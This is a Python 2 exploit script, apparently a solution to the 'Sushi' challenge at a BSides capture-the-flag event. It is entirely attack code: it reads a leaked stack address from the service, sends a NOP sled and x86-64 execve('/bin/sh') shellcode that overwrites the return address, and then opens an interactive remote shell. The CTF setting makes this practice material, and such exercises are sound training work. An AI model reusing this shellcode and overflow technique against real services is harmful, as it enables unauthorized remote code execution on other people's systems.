#!/usr/bin/python

"""

BSides CTF Sushi exploit
pwn-sushi.py

"""

import telnetlib
import socket
import struct
import time


def main():
  s = socket.create_connection(("sushi.termsec.net", 4000))
  shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
  offset=72
  nop="\x90"
  nop_head=8
  siz=len(shellcode)

  msg = s.recv(1024)
  print msg
  buffer_addr = msg[msg.find(":")+2:msg.find("\n")]
  print "\n\t [*] buffer found at " + buffer_addr + "\n"


  payload =  nop*nop_head
  payload += shellcode
  payload += nop*(offset-siz-nop_head)
  payload += struct.pack("<Q", int(buffer_addr))
  payload += "\n"
  print "\n\t [*] CLEARED HOT !!! sending payload...\n"
  time.sleep(0.1)
  s.send(payload)
  print "\n\t [*] payload sent. establishing connection... \n"
  con = telnetlib.Telnet()
  con.sock = s
  print "\n\t [*] SPLASH ONE !!! g07 5h3ll. enter commands:\n"
  con.interact()


if __name__ == "__main__":
  main()
